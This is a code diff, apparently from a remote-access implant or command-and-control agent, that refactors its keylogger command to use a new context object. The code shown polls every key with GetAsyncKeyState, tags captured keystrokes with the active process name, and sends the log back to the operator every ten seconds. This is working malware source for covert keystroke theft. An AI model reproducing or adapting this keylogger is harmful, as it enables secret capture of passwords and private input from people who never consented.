@@ -28,7 +28,7 @@ namespace Agent.Commands
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             if (task.SplittedArgs.Length > 0 && task.SplittedArgs[0] == "stop")
             {
@@ -40,7 +40,7 @@ namespace Agent.Commands
                     }
                     else
                     {
-                        result.Result = "KeyLogger is not running!";
+                        context.Result.Result = "KeyLogger is not running!";
                     }
                 }
                 return;
@@ -50,7 +50,7 @@ namespace Agent.Commands
             {
                 if (isRunning)
                 {
-                    result.Result = "KeyLogger is already running!";
+                    context.Result.Result = "KeyLogger is already running!";
                     return;
                 }
                 else
@@ -63,7 +63,7 @@ namespace Agent.Commands
             string activeProcessName = GetActiveWindowProcessName().ToLower();
             string prevProcessName = activeProcessName;
 
-            result.Result += Environment.NewLine + "[--" + activeProcessName + "--]";
+            context.Result.Result += Environment.NewLine + "[--" + activeProcessName + "--]";
 
             while (true)
             {
@@ -77,7 +77,7 @@ namespace Agent.Commands
                 if (watch.ElapsedMilliseconds >= 10000)
                 {
                     watch.Reset();
-                    commm.SendResult(result);
+                    context.MessageService.SendResult(context.Result);
                     watch.Start();
                 }
 
@@ -85,7 +85,7 @@ namespace Agent.Commands
                 bool isOldProcess = activeProcessName.Equals(prevProcessName);
                 if (!isOldProcess)
                 {
-                    result.Result += Environment.NewLine + "[--" + activeProcessName + "--]";
+                    context.Result.Result += Environment.NewLine + "[--" + activeProcessName + "--]";
                     prevProcessName = activeProcessName;
                 }
 
@@ -99,7 +99,7 @@ namespace Agent.Commands
                     {
                         var keyStr = verifyKey(i);
                         //Debug.WriteLine($"Pressed {i} : {keyStr}");
-                        result.Result += keyStr;
+                        context.Result.Result += keyStr;
                     }
                 }
 
